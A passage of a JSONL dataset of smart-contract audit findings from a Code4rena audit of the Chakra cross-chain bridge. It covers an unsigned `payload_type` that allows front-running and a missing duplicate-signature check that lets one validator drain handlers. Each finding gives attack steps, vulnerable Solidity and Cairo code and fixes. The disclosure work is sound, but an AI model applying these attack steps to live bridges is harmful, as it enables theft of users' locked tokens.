to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n@>              payload_type: payload_type\n            });\n            return true;\n        }\n```\n\n## Proof of concept\n1. Victim initiates a bridging of some ERC20 tokens\n2. A validator get all information, prepare the signatures required and submits the function call to the `receive_cross_chain_msg` of the settlement contract from the destination chain to the public mempool\n3. The attacker monitors the mempool and gathers all the information that the validator would use but changes the `payload_type` to any other implementation. For example, the ERC721\n4. The implementation for this method has been implemented and it triggers this if branch\n5. The validator call will fail because the following check will fail\n```\nrequire(\n    receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n    \"Invalid transaction status\"\n);\n```\n6. The code will have used the information to do whatever the `ERC721` implementation have but the user will not get his ERC20 tokens in the destination chain\n\n\n## Impact\nHigh\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nHash this data into the message, this way it will be unchangeable\n```diff\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n++                  payload_type\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\n\n\n\n## Assessed type\n\nMEV\n", "sections": {"description_md": "## Vulnerability description\nThe normal flow for a message bridge is the following:\n1. User calls `cross_chain_erc20_settlement`\n2. This function triggers `send_cross_chain_msg` in the settlement which will emit the `CrossChainMsg` event\n3. Validators will grab the data from this event and will call `receive_cross_chain_msg` in the destination chain\n...\n\nThis `receive_cross_chain_msg` is intended to only be called by validators, but it can be called by everyone. The protection from a user calling this function with arbitrary data is that the parameters provided are hashed and checked if it has been signed by offchain validators. Hence, nobody would be able to change this data.\n\nHowever, there is a parameter that is not hashed in the messaged signature which can lead to someone frontrunning a validator call and changing this particular parameter.\n\n```\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\nAs we can see, in the `message_hash` we hash all the parameters passed in the function except fom the `payload_type`. Currently, the only supported type is the `ERC20`, but in the future, when other types declared in the `PayloadType` would get an implementation, someone could trigger other implementations that could lead to loses for users who bridged their assets.\n\nCurrently, the receive function in the handler looks like this:\n```\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        ...\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nBut in the future, when other implementations will be added, the attacker will be able to enter the if branch that he wants and can lead to a disaster for the user that used the bridge.\n\nIn the Cairo implementation works different and the attack is still possible but has a completely different impact. In the `receive_cross_chain_msg` it does not check if the `payload_type` is signed by the offchain validators. However, the only use of this variable is to emit it in the `CrossChainHandleResult` event. It is not used anywhere else but in the future it can be used and can be manipulated to execute actions that a user would not be allowed to.\n```\nfn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            ...\n\n            // emit event\n            // pub struct CrossChainHandleResult {\n            //     #[key]\n            //     pub cross_chain_settlement_id: u256,\n            //     pub from_chain: felt252,\n            //     pub from_handler: ContractAddress,\n            //     pub to_chain: felt252,\n            //     pub to_handler: u256,\n            //     pub cross_chain_msg_status: u8,\n            //     pub payload_type: u8,\n            // }\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n@>              payload_type: payload_type\n            });\n            return true;\n        }\n```\n", "impact_md": "## Impact\nHigh\n", "recommendation_md": "## Recommended Mitigation Steps\nHash this data into the message, this way it will be unchangeable\n```diff\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n++                  payload_type\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\n\n\n\n## Assessed type\n\nMEV\n", "poc_md": "## Proof of concept\n1. Victim initiates a bridging of some ERC20 tokens\n2. A validator get all information, prepare the signatures required and submits the function call to the `receive_cross_chain_msg` of the settlement contract from the destination chain to the public mempool\n3. The attacker monitors the mempool and gathers all the information that the validator would use but changes the `payload_type` to any other implementation. For example, the ERC721\n4. The implementation for this method has been implemented and it triggers this if branch\n5. The validator call will fail because the following check will fail\n```\nrequire(\n    receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n    \"Invalid transaction status\"\n);\n```\n6. The code will have used the information to do whatever the `ERC721` implementation have but the user will not get his ERC20 tokens in the destination chain\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L378-L381\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L378-L381\n\n\n# Vulnerability details\n\n## Vulnerability description\nThe normal flow for a message bridge is the following:\n1. User calls `cross_chain_erc20_settlement`\n2. This function triggers `send_cross_chain_msg` in the settlement which will emit the `CrossChainMsg` event\n3. Validators will grab the data from this event and will call `receive_cross_chain_msg` in the destination chain\n...\n\nThis `receive_cross_chain_msg` is intended to only be called by validators, but it can be called by everyone. The protection from a user calling this function with arbitrary data is that the parameters provided are hashed and checked if it has been signed by offchain validators. Hence, nobody would be able to change this data.\n\nHowever, there is a parameter that is not hashed in the messaged signature which can lead to someone frontrunning a validator call and changing this particular parameter.\n\n```\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\nAs we can see, in the `message_hash` we hash all the parameters passed in the function except fom the `payload_type`. Currently, the only supported type is the `ERC20`, but in the future, when other types declared in the `PayloadType` would get an implementation, someone could trigger other implementations that could lead to loses for users who bridged their assets.\n\nCurrently, the receive function in the handler looks like this:\n```\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        ...\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nBut in the future, when other implementations will be added, the attacker will be able to enter the if branch that he wants and can lead to a disaster for the user that used the bridge.\n\nIn the Cairo implementation works different and the attack is still possible but has a completely different impact. In the `receive_cross_chain_msg` it does not check if the `payload_type` is signed by the offchain validators. However, the only use of this variable is to emit it in the `CrossChainHandleResult` event. It is not used anywhere else but in the future it can be used and can be manipulated to execute actions that a user would not be allowed to.\n```\nfn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            ...\n\n            // emit event\n            // pub struct CrossChainHandleResult {\n            //     #[key]\n            //     pub cross_chain_settlement_id: u256,\n            //     pub from_chain: felt252,\n            //     pub from_handler: ContractAddress,\n            //     pub to_chain: felt252,\n            //     pub to_handler: u256,\n            //     pub cross_chain_msg_status: u8,\n            //     pub payload_type: u8,\n            // }\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n@>              payload_type: payload_type\n            });\n            return true;\n        }\n```\n\n## Proof of concept\n1. Victim initiates a bridging of some ERC20 tokens\n2. A validator get all information, prepare the signatures required and submits the function call to the `receive_cross_chain_msg` of the settlement contract from the destination chain to the public mempool\n3. The attacker monitors the mempool and gathers all the information that the validator would use but changes the `payload_type` to any other implementation. For example, the ERC721\n4. The implementation for this method has been implemented and it triggers this if branch\n5. The validator call will fail because the following check will fail\n```\nrequire(\n    receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n    \"Invalid transaction status\"\n);\n```\n6. The code will have used the information to do whatever the `ERC721` implementation have but the user will not get his ERC20 tokens in the destination chain\n\n\n## Impact\nHigh\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nHash this data into the message, this way it will be unchangeable\n```diff\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n\n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n++                  payload_type\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\n\n\n\n## Assessed type\n\nMEV\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/ChakraSettlementHandler.sol#L378-L381\n\n\n# Vulnerability details\n\n## Vulnerability description\nThe normal flow for a message bridge is the following:\n1. User calls `cross_chain_erc20_settlement`\n2. This function triggers `send_cross_chain_msg` in the settlement which will emit the `CrossChainMsg` event\n3. Validators will grab the data from this event and will call `receive_cross_chain_msg` in the destination chain\n...\n\nThis `receive_cross_chain_msg` is intended to only be called by validators, but it can be called by everyone. The protection from a user calling this function with arbitrary data is that the parameters provided are hashed and checked if it has been signed by offchain validators. Hence, nobody would be able to change this data.\n\nHowever, there is a parameter that is not hashed in the messaged signature which can lead to someone frontrunning a validator call and changing this particular parameter.\n\n```\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        \n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\nAs we can see, in the `message_hash` we hash all the parameters passed in the function except fom the `payload_type`. Currently, the only supported type is the `ERC20`, but in the future, when other types declared in the `PayloadType` would get an implementation, someone could trigger other implementations that could lead to loses for users who bridged their assets.\n\nCurrently, the receive function in the handler looks like this:\n```\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n\n        ...\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nBut in the future, when other implementations will be added, the attacker will be able to enter the if branch that he wants and can lead to a disaster for the user that used the bridge.\n\nIn the Cairo implementation works different and the attack is still possible but has a completely different impact. In the `receive_cross_chain_msg` it does not check if the `payload_type` is signed by the offchain validators. However, the only use of this variable is to emit it in the `CrossChainHandleResult` event. It is not used anywhere else but in the future it can be used and can be manipulated to execute actions that a user would not be allowed to.\n```\nfn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8,\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            ...\n\n            // emit event\n            // pub struct CrossChainHandleResult {\n            //     #[key]\n            //     pub cross_chain_settlement_id: u256,\n            //     pub from_chain: felt252,\n            //     pub from_handler: ContractAddress,\n            //     pub to_chain: felt252,\n            //     pub to_handler: u256,\n            //     pub cross_chain_msg_status: u8,\n            //     pub payload_type: u8,\n            // }\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n@>              payload_type: payload_type\n            });\n            return true;\n        }\n```\n\n## Proof of concept\n1. Victim initiates a bridging of some ERC20 tokens\n2. A validator get all information, prepare the signatures required and submits the function call to the `receive_cross_chain_msg` of the settlement contract from the destination chain to the public mempool\n3. The attacker monitors the mempool and gathers all the information that the validator would use but changes the `payload_type` to any other implementation. For example, the ERC721\n4. The implementation for this method has been implemented and it triggers this if branch\n5. The validator call will fail because the following check will fail\n```\nrequire(\n    receive_cross_txs[txid].status == CrossChainMsgStatus.Unknow,\n    \"Invalid transaction status\"\n);\n```\n6. The code will have used the information to do whatever the `ERC721` implementation have but the user will not get his ERC20 tokens in the destination chain\n\n\n## Impact\nHigh\n\n\n## Tools Used\nManual review\n\n## Recommended Mitigation Steps\nHash this data into the message, this way it will be unchangeable\n```diff\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        \n            // verify signature\n            bytes32 message_hash = keccak256(\n                abi.encodePacked(\n                    txid,\n                    from_chain,\n                    from_address,\n                    from_handler,\n                    to_handler,\n++                  payload_type\n                    keccak256(payload)\n                )\n            );\n\n            require(\n                signature_verifier.verify(message_hash, signatures, sign_type),\n                \"Invalid signature\"\n            );\n\n            ...\n    }\n```\n\n\n\n## Assessed type\n\nMEV"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-310", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 310, "page_start": null, "title": "SettlementSignatureVerifier is missing check for duplicate validator signatures", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L193-L214\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173-L190\n\n\n# Vulnerability details\n\n## Impact\n\n`SettlementSignatureVerifier::verifyECDSA` and `settlement::check_chakra_signatures` lack checks for duplicate validators and allow passing the threshold with a single valid signature.\n\n## Proof of Concept\n\nFrom the `README`, we see that `validators` arent trusted roles, they simply have to perform their duties and in case they are misbehaving `MANAGER` can remove them. Its not expected they all to decide to perform a sybil attack.\nBut for this issue single validator can harm the entire protocol because signature verifiers dont check for duplicated validators and one valid signature is enough to pass the check:\n\n## Solidity:\n\n[SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L207)\n\n```solidity\nfunction verifyECDSA(\n    bytes32 msgHash,\n    bytes calldata signatures\n) internal view returns (bool) {\n    require(\n        signatures.length % 65 == 0,\n        \"Signature length must be a multiple of 65\"\n    );\n\n    uint256 len = signatures.length;\n    uint256 m = 0;\n    for (uint256 i = 0; i < len; i += 65) {\n        bytes memory sig = signatures[i:i + 65];\n        if (\n            validators[msgHash.recover(sig)] && ++m >= required_validators\n        ) {\n            return true;\n        }\n    }\n\n    return false;\n}\n```\n\nAs we can see nowhere do we check whether this sig is contained twice in the `signatures` argument.\n\nKnowing that a single validator can call `ChakraSettlement::receive_cross_chain_msg` with arbitrary arguments and drain all the `ChakraSettlementHandler` balances where he is an active validator.\n\nThe caller of the function should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, but even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\nFurthermore, the entire handler can be blocked because of the missing duplicate signature check:\n\n1. **Single** validator can sign `message_hash` that has `ERC20TransferPayload` like this, without locking any tokens in the handler on the source chain:\n\n    ```solidity\n    ERC20TransferPayload memory payload = ERC20TransferPayload(\n        ERC20Method.Transfer,\n        AddressCast.to_uint256(msg.sender),\n        to,//his own address on the destination chain\n        AddressCast.to_uint256(token),\n        to_token,\n        //if SettlementMode: LockMint or MintBurn\n        (type(uint256).max - IERC20(token).totalSupply())\n        //if SettlementMode: LockUnlock or BurnUnlock\n        IERC20(token).balanceOf(address(from_handler))\n    );\n    ```\n\n2. Then he will call the `ChakraSettlement::receive_cross_chain_msg` on the destination and signature validation will pass because he passed his signature to the `signatures` argument enough times so the `signature_verifier.verify` returns **true** (again this happens due to the missing duplicate signatures check):\n\n    For example if the `required_validators` = 3, his `signature` bytes will look like this:\n\n    `[0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.0xf86c0a8502540be400825208944.]`, where dots are the remaining bytes but I think you got it ;)\n\n    ```solidity\n    function verifyECDSA(\n        bytes32 msgHash,\n        bytes calldata signatures\n    ) internal view returns (bool) {\n        require(\n            signatures.length % 65 == 0,\n            \"Signature length must be a multiple of 65\"\n        );\n\n        uint256 len = signatures.length;\n        uint256 m = 0;\n        for (uint256 i = 0; i < len; i += 65) {\n            bytes memory sig = signatures[i:i + 65];\n            if (\n                validators[msgHash.recover(sig)] && ++m >= required_validators\n            ) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n    ```\n\n3. `ChakraSettlementHandler::receive_cross_chain_msg` will be executed:\n\n    ```solidity\n    bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n        txid,\n        from_chain,\n        from_address,\n        from_handler,\n        payload_type,\n        payload,\n        sign_type,\n        signatures\n    );\n    ```\n\n4. Malicious `ERC20TransferPayload` will be encoded and the handler will either mint to the attacker the amount which will make the `totalSupply` of the token = `uint256.max` if the mode is `mint` or the entire balance of the `ChakraSettlementHandler` stealing the locked tokens of the honest users.\n\n## Cairo:\n\nThe same issue applies to the `Cairo` code as well:\n\n[settlement.cairo](https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L173C7-L173C8)\n\n```rust\nfn check_chakra_signatures(\n    self: @ContractState, message_hash: felt252, signatures: Array<(felt252, felt252, bool)>\n){\n    let mut pass_count = 0;\n    let mut i = 0;\n    loop {\n        if i > signatures.len()-1{\n            break;\n        }\n        let (r,s,y) = * signatures.at(i);\n\n        let pub_key: felt252 = recover_public_key(message_hash,r,s,y).unwrap();\n        if self.chakra_validators_pubkey.read(pub_key) > 0{\n            pass_count += 1;\n        }\n        i += 1;\n    };\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough validate signatures');\n}\n```\n\nHere, `settlement::receive_cross_chain_msg` also can be called directly from a single validator and bypass all the checks, stealing the entire balance of the handler.\n\nThe caller of the functions should only give valid chains and handlers, the payload will also be valid so it can be decoded but the `amount` will be the entire balance (this is the max impact, even 1 wei is considered steal because the caller has not burned or locked any tokens by first calling the `send_cross_chain_msg` function) of the handler.\n\n> In case both issues are separated because they happen in different places we split this one into two, covering both languages, so it is to be accepted by both.\n>\n\n> ***NOTE**: Keep in mind that the issue shows that any validator can drain the entire protocol due to a missing duplicate signatures (used) check that allows him to do anything with only 1 signed message. The problem is not only that validators are not trusted, when the problem is fixed as below, even if a validator decides to do something like that, he can't achieve it, that's why `required_validators` is defined at all to protect the protocol from situations like this.*\n>\n\nIn the end this single validator doesnt lose anything, nowhere in the `README` it is mentioned that they are trusted, or any token stake is required from them, the only thing that can lose is their rights to continue signing transactions. On the other hand, they will receive the entire token supply or entire locked token balance.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nFor Solidity:\n\n```diff\n+ mapping (bytes32 msgHash => mapping(address validator => bool usedSig)) public isSignatureUsed;\n\n  function verifyECDSA(\n      bytes32 msgHash,\n      bytes calldata signatures\n  ) internal view returns (bool) {\n      require(\n          signatures.length % 65 == 0,\n          \"Signature length must be a multiple of 65\"\n      );\n\n      uint256 len = signatures.length;\n      uint256 m = 0;\n      for (uint256 i = 0; i < len; i += 65) {\n          bytes memory sig = signatures[i:i + 65];\n\n+         address validator = msgHash.recover(sig);\n          if (\n-             validators[msgHash.recover(sig)] && ++m >= required_validators\n+             !isSignatureUsed[msgHash][validator] && validators[validator]\n          ) {\n+             isSignatureUsed[msgHash][validator] = true;\n+             m++;\n          }\n\n+         if (m >= required_validators) {\n+             return true;\n+         }\n      }\n\n      return false;\n  }\n```\n\nFor Cairo:\n\n```diff\nfn check_chakra_signatures(\n    self: @ContractState,\n    message_hash: felt252,\n    signatures: Array<(felt252, felt252, bool)>\n) {\n    let mut pass_count = 0;\n    let mut i = 0;\n\n    // A set-like structure to keep track of processed public keys.\n+   let mut processed_pub_keys: LegacyMap<felt252, u8> = LegacyMap::new();\n\n    loop {\n        if i > signatures.len() - 1 {\n            break;\n        }\n\n        let (r, s, y) = *signatures.at(i);\n        let pub_key: felt252 = recover_public_key(message_hash, r, s, y).unwrap();\n-       if self.chakra_validators_pubkey.read(pub_key) > 0{\n+       if processed_pub_keys.get(pub_key) == 0 && self.chakra_validators_pubkey.read(pub_key) > 0 {\n            pass_count += 1;\n+           processed_pub_keys.append(pub_key);\n        }\n\n        i += 1;\n    }\n\n    assert(pass_count >= self.required_validators_num.read(), 'Not enough valid signatures');\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\n\n`SettlementSignatureVerifier::verifyECDSA` and `settlement::check_chakra_signatures` lack checks for duplicate validators and allow passing the threshold with a single valid signature.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nFor Solidity:\n\n```diff\n+ mapping (bytes32 msgHash => mapping(address validator => bool usedSig)) public isSignatureUsed;\n\n  function verifyECDSA(\n      bytes32 msgHash,\n      bytes calldata signatures\n  ) internal view returns (bool) {\n      require(\n          signatures.length % 65 == 0,\n          \"Signature length must be a multiple of 65\"\n      );\n\n      uint256 len = signatures.length;\n      uint256 m = 0;\n      for (uint256 i = 0; i < len; i += 65) {\n          bytes memory sig = signatures[i:i + 65];\n\n+         address validator = msgHash.recover(sig);\n          if (\n-             validators[msgHash.recover(sig)] && ++m >= required_validators\n+             !isSignatureUsed[msgHash][validator] && validators[validator]\n          ) {\n+             isSignatureUsed[msgHash][validator] = true;\n+             m++;\n          }\n\n+         if (m >= required_validators) {\n+             return true;\n+         }\n      }\n\n      return false;\n  }\n```\n\nFor Cairo:\n\n```diff\nfn check_chakra_signatures(\n    self: @ContractState,\n    message_hash: felt252,\n    signatures: 